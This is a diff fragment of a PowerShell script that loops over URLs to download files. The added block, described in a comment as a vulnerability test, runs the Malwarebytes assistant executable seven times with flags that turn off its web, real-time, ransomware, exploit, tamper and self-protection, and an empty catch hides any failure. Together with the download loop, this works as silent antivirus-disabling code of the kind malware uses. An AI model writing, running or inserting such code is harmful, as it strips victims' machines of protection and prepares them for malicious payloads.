@@ -154,6 +154,23 @@ foreach ($url in $urls) {
     } catch {
         Write-Host "Failed to download file: $url"
     }
+
+    try {
+
+    # Test vulnerability allowing malwarebytes anti-malware (MBAM) to be disabled automatically
+    
+    Start-Process -FilePath "C:\Program Files\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe" -ArgumentList "--disablewebprotection", "."
+    Start-Process -FilePath "C:\Program Files\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe" -ArgumentList "--disablertp", "."
+    Start-Process -FilePath "C:\Program Files\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe" -ArgumentList "--disablerw", "."
+    Start-Process -FilePath "C:\Program Files\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe" -ArgumentList "--disableae", "."
+    Start-Process -FilePath "C:\Program Files\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe" -ArgumentList "--disabletamperprotection", "."
+    Start-Process -FilePath "C:\Program Files\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe" -ArgumentList "--disableautodbcls", "."
+    Start-Process -FilePath "C:\Program Files\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe" -ArgumentList "--disablesp", "."
+
+    } catch {
+        
+    }
+    
 }
 
 # Arth-End loop
